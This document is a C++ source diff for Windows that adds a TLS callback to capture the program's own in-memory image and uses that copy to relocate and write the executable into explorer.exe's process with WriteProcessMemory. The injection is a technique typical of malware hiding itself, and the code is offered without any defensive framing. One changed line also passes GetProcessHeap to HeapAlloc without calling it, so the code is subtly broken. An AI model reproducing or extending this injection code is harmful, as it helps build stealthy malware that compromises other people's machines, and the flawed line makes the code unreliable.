@@ -11,6 +11,7 @@
 enum class MonitorState { STATE_MIGRATE, STATE_MONITOR };
 
 MonitorState MAIN_STATE = MonitorState::STATE_MIGRATE;
+uint8_t *FRESH_IMAGE = nullptr;
 
 void exit_thread(void) {
    ExitThread(0);
@@ -20,6 +21,23 @@ PIMAGE_NT_HEADERS64 get_nt_headers(std::uint8_t *base) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
    return (PIMAGE_NT_HEADERS64)&base[dos_header->e_lfanew];
 }
+
+VOID WINAPI get_fresh_image(PVOID instance, DWORD reason, PVOID reserved) {
+   if (reason != DLL_PROCESS_ATTACH)
+      return;
+
+   std::uint8_t *self_u8 = (std::uint8_t *)instance;
+   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(self_u8);
+   FRESH_IMAGE = (std::uint8_t *)HeapAlloc(GetProcessHeap, HEAP_ZERO_MEMORY, nt_headers->OptionalHeader.SizeOfImage);
+   std::memcpy(FRESH_IMAGE, self_u8, nt_headers->OptionalHeader.SizeOfImage);
+}
+
+#pragma comment(linker, "/INCLUDE:_tls_used")
+#pragma comment(linker, "/INCLUDE:tls_callback")
+#pragma const_seg(push)
+#pragma const_seg(".CRT$XLAAA")
+extern "C" const PIMAGE_TLS_CALLBACK tls_callback = get_fresh_image;
+#pragma const_seg(pop)
 
 void relocate_image(std::uint8_t *image, std::uintptr_t from, std::uintptr_t to) {
    PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(image);
@@ -34,11 +52,11 @@ void relocate_image(std::uint8_t *image, std::uintptr_t from, std::uintptr_t to)
    while (((PIMAGE_BASE_RELOCATION)base_reloc)->VirtualAddress != 0) {
       PIMAGE_BASE_RELOCATION base_reloc_block = (PIMAGE_BASE_RELOCATION)base_reloc;
       WORD *entry_table = (WORD *)&base_reloc[sizeof(IMAGE_BASE_RELOCATION)];
-      size_t entries = (base_reloc_block->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
+      std::size_t entries = (base_reloc_block->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
 
-      for (size_t i=0; i<entries; ++i) {
+      for (std::size_t i=0; i<entries; ++i) {
          DWORD reloc_rva = base_reloc_block->VirtualAddress + (entry_table[i] & 0xFFF);
-         uintptr_t *reloc_ptr = (uintptr_t *)&image[reloc_rva];
+         std::uintptr_t *reloc_ptr = (std::uintptr_t *)&image[reloc_rva];
                
          if ((entry_table[i] >> 12) == IMAGE_REL_BASED_DIR64)
             *reloc_ptr += base_delta;
@@ -89,6 +107,8 @@ DWORD WINAPI load_image(LPVOID image_base) {
          ++callbacks;
       }
    }
+
+   MAIN_STATE = MonitorState::STATE_MONITOR;
 
    return 0;
 }
@@ -150,7 +170,7 @@ int main(int argc, char *argv[]) {
       
       /* copy the executable in memory and relocate it to the allocated base */
       std::uint8_t *copy_u8 = (std::uint8_t *)std::malloc(self_nt->OptionalHeader.SizeOfImage);
-      std::memcpy(copy_u8, self_u8, self_nt->OptionalHeader.SizeOfImage);
+      std::memcpy(copy_u8, FRESH_IMAGE, self_nt->OptionalHeader.SizeOfImage);
       relocate_image(copy_u8, (std::uintptr_t)self_u8, explorer_base);
       
       /* write the relocated executable to the process's allocation with WriteProcessMemory */
